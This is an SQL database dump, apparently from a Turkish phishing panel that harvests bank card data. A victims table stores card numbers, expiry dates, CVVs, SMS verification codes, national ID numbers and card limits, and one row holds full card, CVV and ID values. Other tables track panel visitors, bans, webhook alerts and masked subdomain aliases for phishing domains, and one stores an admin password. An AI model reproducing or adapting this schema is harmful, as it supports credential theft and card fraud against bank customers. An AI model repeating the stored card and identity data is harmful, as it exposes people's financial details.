CREATE TABLE back (
    back TEXT NOT NULL
);


CREATE TABLE ban (
    ban TEXT NOT NULL,
    ulke TEXT NOT NULL,
    date TEXT NOT NULL,
    cihaz TEXT NOT NULL,
    tarayici TEXT NOT NULL
);


CREATE TABLE hata1 (
    hata1 TEXT NOT NULL
);

INSERT INTO hata1 (hata1) VALUES ('127.0.0.1');

CREATE TABLE hata2 (
    hata2 TEXT NOT NULL
);


CREATE TABLE hata3 (
    hata3 TEXT NOT NULL
);


CREATE TABLE ips (
    id BIGSERIAL PRIMARY KEY,
    ipAddress TEXT NOT NULL,
    lastOnline INTEGER NOT NULL
);

INSERT INTO ips (id, ipAddress, lastOnline) VALUES (1, '127.0.0.1', 1763541353);

CREATE TABLE paneldekiler (
    ip TEXT NOT NULL,
    tarih TEXT NOT NULL,
    tarayici TEXT NOT NULL,
    durum TEXT NOT NULL
);

INSERT INTO paneldekiler (ip, tarih, tarayici, durum) VALUES ('127.0.0.1', '19.11.2025 12:58', 'Edge 143.0.0', 'Panel Ayarlarý');

CREATE TABLE sazan (
    id BIGSERIAL PRIMARY KEY,
    date TEXT NOT NULL,
    kk TEXT,
    sonkul TEXT,
    cvv TEXT,
    kartlimit INTEGER DEFAULT 0,
    sms TEXT,
    now TEXT DEFAULT 'Anasayfa',
    back INTEGER DEFAULT 0,
    ip TEXT NOT NULL,
    lastOnline INTEGER,
    banka TEXT,
    tc TEXT NOT NULL,
    cihaz TEXT NOT NULL,
    tarayici TEXT NOT NULL,
    toplam_limit INTEGER DEFAULT 0,
    guncel_limit INTEGER DEFAULT 0
);

INSERT INTO sazan (id, date, kk, sonkul, cvv, kartlimit, sms, now, back, ip, lastOnline, banka, tc, cihaz, tarayici, toplam_limit, guncel_limit) VALUES (10, '17.11.2025 15:03', '4155650177639256', '12/26', '456', 90000, '6666', 'Anasayfa', 0, '127.0.0.1', NULL, 'Qnb Bank A.S', '52159615352', 'Masaüstü', 'Edge 143.0.0', 500000, 90000);

CREATE TABLE site (
    id BIGSERIAL PRIMARY KEY,
    pass TEXT NOT NULL,
    kart_sesi INTEGER DEFAULT 0,
    sms_sesi INTEGER DEFAULT 0,
    webhook INTEGER DEFAULT 0,
    webhookURL TEXT DEFAULT '.',
    tutar TEXT NOT NULL
);

INSERT INTO site (id, pass, kart_sesi, sms_sesi, webhook, webhookURL, tutar) VALUES (1, 'yO7NeC2hFKvLWF@b^zS!', 0, 0, 0, '.', '150');

CREATE TABLE sms (
    sms TEXT NOT NULL
);

INSERT INTO sms (sms) VALUES ('127.0.0.1');

CREATE TABLE tebrik (
    tebrik TEXT NOT NULL
);


CREATE TABLE app_settings (
    key TEXT PRIMARY KEY,
    value TEXT
);

CREATE UNIQUE INDEX sqlite_autoindex_app_settings_1 ON app_settings (key);
INSERT INTO app_settings (key, value) VALUES ('public_ip', '104.28.212.150');
INSERT INTO app_settings (key, value) VALUES ('site_name', 'ekrandan-odeme-yapildi');
INSERT INTO app_settings (key, value) VALUES ('local_ip', '127.0.0.1');
INSERT INTO app_settings (key, value) VALUES ('ssl_hosts', 'sanexgroup.com');

CREATE TABLE cloudflared_logs (
    id BIGSERIAL PRIMARY KEY,
    command TEXT NOT NULL,
    stdout TEXT,
    stderr TEXT,
    status TEXT,
    created_at TEXT DEFAULT CURRENT_TIMESTAMP
);


CREATE TABLE domain_aliases (
    id TEXT PRIMARY KEY,
    base_domain TEXT NOT NULL,
    subdomain TEXT NOT NULL DEFAULT '',
    masked_subdomain TEXT NOT NULL,
    created_at TEXT DEFAULT CURRENT_TIMESTAMP
);

CREATE UNIQUE INDEX idx_domain_alias_real ON domain_aliases (base_domain, subdomain);
CREATE UNIQUE INDEX idx_domain_alias_masked ON domain_aliases (masked_subdomain);
CREATE UNIQUE INDEX sqlite_autoindex_domain_aliases_1 ON domain_aliases (id);

